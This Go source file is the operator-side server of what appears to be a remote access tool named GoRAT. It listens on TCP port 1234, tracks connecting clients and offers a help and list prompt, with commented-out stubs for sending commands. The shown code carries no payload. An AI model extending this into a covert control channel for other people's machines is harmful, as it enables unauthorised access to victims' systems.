package server

import (
	"GoRAT/internal/server/render"
	"fmt"
	"github.com/pterm/pterm"
	"net"
)

func Server() {

	err := render.MainBanner()

	if err != nil {
		fmt.Println(err)
		return
	}

	listener, err := net.Listen("tcp", ":1234")

	var list ClientList
	var command string

	if err != nil {
		fmt.Println(err)
		return
	}

	defer func(listener net.Listener) {
		err := listener.Close()
		if err != nil {
			fmt.Println(err)
			return
		}
	}(listener)

	go newConnectionHandler(listener, &list)

	for {
		fmt.Println()
		fmt.Print(">> ")
		_, err := fmt.Scan(&command)

		if err != nil {
			fmt.Println(err)
			continue
		}

		if command == "h" || command == "help" {
			err := render.MainCommands()
			if err != nil {
				fmt.Println(err)
				continue
			}
		} else if command == "list" || command == "ls" {
			var clients []string

			for i, client := range list.list {
				clients = append(clients, string(i))
				clients = append(clients, client.name)
			}

			fmt.Println(clients)

		} else {
			pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Println("Wrong command. input 'h' or 'help' to show commands ")
		}

		//if command == "list" || command == "ls" {
		//	fmt.Println(len(list.list))
		//} else if command == "command" {
		//	list.list[0].conn.Write([]byte("Hello"))
		//} else if command == "rm" {
		//	list.removeClient(list.list[0])
		//}
	}
}

func newConnectionHandler(listener net.Listener, list *ClientList) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			return
		}

		client := Client{name: conn.LocalAddr().String(), conn: conn}
		go client.clientHandler(list)
	}
}
